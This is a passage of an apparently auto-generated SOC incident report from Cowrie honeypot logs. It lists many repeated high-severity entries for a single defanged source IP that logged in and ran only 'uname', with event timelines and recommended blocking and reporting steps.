- [ ] Submit `91.92.40[.]153` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]153` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-dedca907d732

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]153` |
| **First Seen** | 2026-08-24 01:27 |
| **Last Seen** | 2026-08-24 01:27 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 01:27:20` | `cowrie.session.connect` |
| `2026-08-24 01:27:20` | `cowrie.client.version` |
| `2026-08-24 01:27:20` | `cowrie.client.kex` |
| `2026-08-24 01:27:21` | `cowrie.login.success` |
| `2026-08-24 01:27:21` | `cowrie.session.params` |
| `2026-08-24 01:27:21` | `cowrie.command.input` |
| `2026-08-24 01:27:22` | `cowrie.log.closed` |
| `2026-08-24 01:27:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]153` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]153` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ecb77fcd57d5

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]153` |
| **First Seen** | 2026-08-24 01:27 |
| **Last Seen** | 2026-08-24 01:27 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 01:27:25` | `cowrie.session.connect` |
| `2026-08-24 01:27:26` | `cowrie.client.version` |
| `2026-08-24 01:27:26` | `cowrie.client.kex` |
| `2026-08-24 01:27:26` | `cowrie.login.success` |
| `2026-08-24 01:27:27` | `cowrie.session.params` |
| `2026-08-24 01:27:27` | `cowrie.command.input` |
| `2026-08-24 01:27:27` | `cowrie.log.closed` |
| `2026-08-24 01:27:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]153` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]153` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6d7d7d11c978

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]153` |
| **First Seen** | 2026-08-24 01:27 |
| **Last Seen** | 2026-08-24 01:27 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 01:27:31` | `cowrie.session.connect` |
| `2026-08-24 01:27:31` | `cowrie.client.version` |
| `2026-08-24 01:27:31` | `cowrie.client.kex` |
| `2026-08-24 01:27:31` | `cowrie.login.success` |
| `2026-08-24 01:27:32` | `cowrie.session.params` |
| `2026-08-24 01:27:32` | `cowrie.command.input` |
| `2026-08-24 01:27:32` | `cowrie.log.closed` |
| `2026-08-24 01:27:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]153` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]153` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f5214035d432

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]153` |
| **First Seen** | 2026-08-24 01:27 |
| **Last Seen** | 2026-08-24 01:27 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 01:27:36` | `cowrie.session.connect` |
| `2026-08-24 01:27:36` | `cowrie.client.version` |
| `2026-08-24 01:27:36` | `cowrie.client.kex` |
| `2026-08-24 01:27:37` | `cowrie.login.success` |
| `2026-08-24 01:27:38` | `cowrie.session.params` |
| `2026-08-24 01:27:38` | `cowrie.command.input` |
| `2026-08-24 01:27:38` | `cowrie.log.closed` |
| `2026-08-24 01:27:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]153` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]153` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0f0222708637

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]153` |
| **First Seen** | 2026-08-24 01:27 |
| **Last Seen** | 2026-08-24 01:27 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 01:27:41` | `cowrie.session.connect` |
| `2026-08-24 01:27:41` | `cowrie.client.version` |
| `2026-08-24 01:27:41` | `cowrie.client.kex` |
| `2026-08-24 01:27:42` | `cowrie.login.success` |
| `2026-08-24 01:27:43` | `cowrie.session.params` |
| `2026-08-24 01:27:43` | `cowrie.command.input` |
| `2026-08-24 01:27:43` | `cowrie.log.closed` |
| `2026-08-24 01:27:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]153` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]153` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-863bfa8a265e

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]153` |
| **First Seen** | 2026-08-24 01:27 |
| **Last Seen** | 2026-08-24 01:27 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 01:27:47` | `cowrie.session.connect` |
| `2026-08-24 01:27:47` | `cowrie.client.version` |
| `2026-08-24 01:27:47` | `cowrie.client.kex` |
| `2026-08-24 01:27:47` | `cowrie.login.success` |
| `2026-08-24 01:27:48` | `cowrie.session.params` |
| `2026-08-24 01:27:48` | `cowrie.command.input` |
| `2026-08-24 01:27:48` | `cowrie.log.closed` |
| `2026-08-24 01:27:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]153` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]153` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1bb8e99f9808

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]153` |
| **First Seen** | 2026-08-24 01:27 |
| **Last Seen** | 2026-08-24 01:27 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 01:27:52` | `cowrie.session.connect` |
| `2026-08-24 01:27:52` | `cowrie.client.version` |
| `2026-08-24 01:27:52` | `cowrie.client.kex` |
| `2026-08-24 01:27:53` | `cowrie.login.success` |
| `2026-08-24 01:27:54` | `cowrie.session.params` |
| `2026-08-24 01:27:54` | `cowrie.command.input` |
| `2026-08-24 01:27:54` | `cowrie.log.closed` |
| `2026-08-24 01:27:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]153` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]153` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c9db986f9855

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]153` |
| **First Seen** | 2026-08-24 01:27 |
| **Last Seen** | 2026-08-24 01:27 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 01:27:57` | `cowrie.session.connect` |
| `2026-08-24 01:27:57` | `cowrie.client.version` |
| `2026-08-24 01:27:57` | `cowrie.client.kex` |
| `2026-08-24 01:27:58` | `cowrie.login.success` |
| `2026-08-24 01:27:59` | `cowrie.session.params` |
| `2026-08-24 01:27:59` | `cowrie.command.input` |
| `2026-08-24 01:27:59` | `cowrie.log.closed` |
| `2026-08-24 01:27:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]153` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]153` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ab95599feba9

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]153` |
| **First Seen** | 2026-08-24 01:28 |
| **Last Seen** | 2026-08-24 01:28 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 01:28:03` | `cowrie.session.connect` |
| `2026-08-24 01:28:03` | `cowrie.client.version` |
| `2026-08-24 01:28:03` | `cowrie.client.kex` |
| `2026-08-24 01:28:03` | `cowrie.login.success` |
| `2026-08-24 01:28:04` | `cowrie.session.params` |
| `2026-08-24 01:28:04` | `cowrie.command.input` |
| `2026-08-24 01:28:04` | `cowrie.log.closed` |
| `2026-08-24 01:28:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]153` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]153` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-40c2b0a8ae39

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]153` |
| **First Seen** | 2026-08-24 01:28 |
| **Last Seen** | 2026-08-24 01:28 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 01:28:08` | `cowrie.session.connect` |
| `2026-08-24 01:28:08` | `cowrie.client.version` |
| `2026-08-24 01:28:08` | `cowrie.client.kex` |
| `2026-08-24 01:28:09` | `cowrie.login.success` |
| `2026-08-24 01:28:09` | `cowrie.session.params` |
| `2026-08-24 01:28:09` | `cowrie.command.input` |
| `2026-08-24 01:28:09` | `cowrie.log.closed` |
| `2026-08-24 01:28:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]153` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]153` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f82ac33c35c0

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]153` |
| **First Seen** | 2026-08-24 01:28 |
| **Last Seen** | 2026-08-24 01:28 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 01:28:13` | `cowrie.session.connect` |
| `2026-08-24 01:28:13` | `cowrie.client.version` |
| `2026-08-24 01:28:13` | `cowrie.client.kex` |
| `2026-08-24 01:28:14` | `cowrie.login.success` |
| `2026-08-24 01:28:15` | `cowrie.session.params` |
| `2026-08-24 01:28:15` | `cowrie.command.input` |
| `2026-08-24 01:28:15` | `cowrie.log.closed` |
| `2026-08-24 01:28:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]153` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]153` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8aa2525b829f

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]153` |
| **First Seen** | 2026-08-24 01:28 |
| **Last Seen** | 2026-08-24 01:28 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 01:28:18` | `cowrie.session.connect` |
| `2026-08-24 01:28:19` | `cowrie.client.version` |
| `2026-08-24 01:28:19` | `cowrie.client.kex` |
| `2026-08-24 01:28:19` | `cowrie.login.success` |
| `2026-08-24 01:28:20` | `cowrie.session.params` |
| `2026-08-24 01:28:20` | `cowrie.command.input` |
| `2026-08-24 01:28:20` | `cowrie.log.closed` |
| `2026-08-24 01:28:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]153` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]153` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c23e1ea327ca

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]153` |
| **First Seen** | 2026-08-24 01:28 |
| **Last Seen** | 2026-08-24 01:28 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 01:28:24` | `cowrie.session.connect` |
| `2026-08-24 01:28:24` | `cowrie.client.version` |
| `2026-08-24 01:28:24` | `cowrie.client.kex` |
| `2026-08-24 01:28:24` | `cowrie.login.success` |
| `2026-08-24 01:28:25` | `cowrie.session.params` |
| `2026-08-24 01:28:25` | `cowrie.command.input` |
| `2026-08-24 01:28:25` | `cowrie.log.closed` |
| `2026-08-24 01:28:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]153` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]153` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b02b4493b22b

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]153` |
| **First Seen** | 2026-08-24 01:28 |
| **Last Seen** | 2026-08-24 01:28 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 01:28:29` | `cowrie.session.connect` |
| `2026-08-24 01:28:29` | `cowrie.client.version` |
| `2026-08-24 01:28:29` | `cowrie.client.kex` |
| `2026-08-24 01:28:30` | `cowrie.login.success` |
| `2026-08-24 01:28:30` | `cowrie.session.params` |
| `2026-08-24 01:28:30` | `cowrie.command.input` |
| `2026-08-24 01:28:30` | `cowrie.log.closed` |
| `2026-08-24 01:28:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]153` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]153` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-19aa340dfc57

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]153` |
| **First Seen** | 2026-08-24 01:28 |
| **Last Seen** | 2026-08-24 01:28 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 01:28:34` | `cowrie.session.connect` |
| `2026-08-24 01:28:34` | `cowrie.client.version` |
| `2026-08-24 01:28:34` | `cowrie.client.kex` |
| `2026-08-24 01:28:35` | `cowrie.login.success` |
| `2026-08-24 01:28:36` | `cowrie.session.params` |
| `2026-08-24 01:28:36` | `cowrie.command.input` |
| `2026-08-24 01:28:36` | `cowrie.log.closed` |
| `2026-08-24 01:28:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]153` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]153` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-801402cb2ea2

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]153` |
| **First Seen** | 2026-08-24 01:28 |
| **Last Seen** | 2026-08-24 01:28 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 01:28:39` | `cowrie.session.connect` |
| `2026-08-24 01:28:39` | `cowrie.client.version` |
| `2026-08-24 01:28:40` | `cowrie.client.kex` |
| `2026-08-24 01:28:40` | `cowrie.login.success` |
| `2026-08-24 01:28:41` | `cowrie.session.params` |
| `2026-08-24 01:28:41` | `cowrie.command.input` |
| `2026-08-24 01:28:41` | `cowrie.log.closed` |
| `2026-08-24 01:28:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]153` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]153` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-31dd259e1cb6

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]153` |
| **First Seen** | 2026-08-24 01:28 |
| **Last Seen** | 2026-08-24 01:28 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 01:28:44` | `cowrie.session.connect` |
| `2026-08-24 01:28:44` | `cowrie.client.version` |
| `2026-08-24 01:28:45` | `cowrie.client.kex` |
| `2026-08-24 01:28:45` | `cowrie.login.success` |
| `2026-08-24 01:28:46` | `cowrie.session.params` |
| `2026-08-24 01:28:46` | `cowrie.command.input` |
| `2026-08-24 01:28:46` | `cowrie.log.closed` |
| `2026-08-24 01:28:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]153` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]153` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-83a72f4d16be

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]153` |
| **First Seen** | 2026-08-24 01:28 |
| **Last Seen** | 2026-08-24 01:28 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 01:28:50` | `cowrie.session.connect` |
| `2026-08-24 01:28:50` | `cowrie.client.version` |
| `2026-08-24 01:28:50` | `cowrie.client.kex` |
| `2026-08-24 01:28:50` | `cowrie.login.success` |
| `2026-08-24 01:28:51` | `cowrie.session.params` |
| `2026-08-24 01:28:51` | `cowrie.command.input` |
| `2026-08-24 01:28:51` | `cowrie.log.closed` |
| `2026-08-24 01:28:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]153` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]153` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-007144610b2a

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]153` |
| **First Seen** | 2026-08-24 01:28 |
| **Last Seen** | 2026-08-24 01:28 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 01:28:55` | `cowrie.session.connect` |
| `2026-08-24 01:28:55` | `cowrie.client.version` |
| `2026-08-24 01:28:55` | `cowrie.client.kex` |
| `2026-08-24 01:28:55` | `cowrie.login.success` |
| `2026-08-24 01:28:56` | `cowrie.session.params` |
| `2026-08-24 01:28:56` | `cowrie.command.input` |
| `2026-08-24 01:28:56` | `cowrie.log.closed` |
| `2026-08-24 01:28:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]153` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]153` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ed1208e45c53

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]153` |
| **First Seen** | 2026-08-24 01:29 |
| **Last Seen** | 2026-08-24 01:29 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 01:29:00` | `cowrie.session.connect` |
| `2026-08-24 01:29:00` | `cowrie.client.version` |
| `2026-08-24 01:29:00` | `cowrie.client.kex` |
| `2026-08-24 01:29:01` | `cowrie.login.success` |
| `2026-08-24 01:29:01` | `cowrie.session.params` |
| `2026-08-24 01:29:01` | `cowrie.command.input` |
| `2026-08-24 01:29:02` | `cowrie.log.closed` |
| `2026-08-24 01:29:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]153` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]153` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-141d1c6e3577

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]153` |
| **First Seen** | 2026-08-24 01:29 |
| **Last Seen** | 2026-08-24 01:29 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 01:29:05` | `cowrie.session.connect` |
| `2026-08-24 01:29:05` | `cowrie.client.version` |
| `2026-08-24 01:29:05` | `cowrie.client.kex` |
| `2026-08-24 01:29:06` | `cowrie.login.success` |
| `2026-08-24 01:29:07` | `cowrie.session.params` |
| `2026-08-24 01:29:07` | `cowrie.command.input` |
| `2026-08-24 01:29:07` | `cowrie.log.closed` |
| `2026-08-24 01:29:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]153` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]153` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-82684e3dacc8

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]153` |
| **First Seen** | 2026-08-24 01:29 |
| **Last Seen** | 2026-08-24 01:29 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 01:29:11` | `cowrie.session.connect` |
| `2026-08-24 01:29:11` | `cowrie.client.version` |
| `2026-08-24 01:29:11` | `cowrie.client.kex` |
| `2026-08-24 01:29:11` | `cowrie.login.success` |
| `2026-08-24 01:29:12` | `cowrie.session.params` |
| `2026-08-24 01:29:12` | `cowrie.command.input` |
| `2026-08-24 01:29:12` | `cowrie.log.closed` |
| `2026-08-24 01:29:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]153` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]153` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1d62637cfbbb

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]153` |
| **First Seen** | 2026-08-24 01:29 |
| **Last Seen** | 2026-08-24 01:29 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 01:29:16` | `cowrie.session.connect` |
| `2026-08-24 01:29:16` | `cowrie.client.version` |
| `2026-08-24 01:29:16` | `cowrie.client.kex` |
| `2026-08-24 01:29:16` | `cowrie.login.success` |
| `2026-08-24 01:29:17` | `cowrie.session.params` |
| `2026-08-24 01:29:17` | `cowrie.command.input` |
| `2026-08-24 01:29:17` | `cowrie.log.closed` |
| `2026-08-24 01:29:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]153` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]153` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0a4f66f9c867

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]153` |
| **First Seen** | 2026-08-24 01:29 |
| **Last Seen** | 2026-08-24 01:29 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 01:29:21` | `cowrie.session.connect` |
| `2026-08-24 01:29:21` | `cowrie.client.version` |
| `2026-08-24 01:29:21` | `cowrie.client.kex` |
| `2026-08-24 01:29:21` | `cowrie.login.success` |
| `2026-08-24 01:29:22` | `cowrie.session.params` |
| `2026-08-24 01:29:22` | `cowrie.command.input` |
| `2026-08-24 01:29:22` | `cowrie.log.closed` |
| `2026-08-24 01:29:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]153` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]153` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-86dcb0db5000

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]153` |
| **First Seen** | 2026-08-24 01:29 |
| **Last Seen** | 2026-08-24 01:29 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 01:29:26` | `cowrie.session.connect` |
| `2026-08-24 01:29:26` | `cowrie.client.version` |
| `2026-08-24 01:29:26` | `cowrie.client.kex` |
| `2026-08-24 01:29:27` | `cowrie.login.success` |
| `2026-08-24 01:29:28` | `cowrie.session.params` |
| `2026-08-24 01:29:28` | `cowrie.command.input` |
| `2026-08-24 01:29:28` | `cowrie.log.closed` |
| `2026-08-24 01:29:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]153` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]153` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-06c430ab399a

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]153` |
| **First Seen** | 2026-08-24 01:29 |
| **Last Seen** | 2026-08-24 01:29 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 01:29:31` | `cowrie.session.connect` |
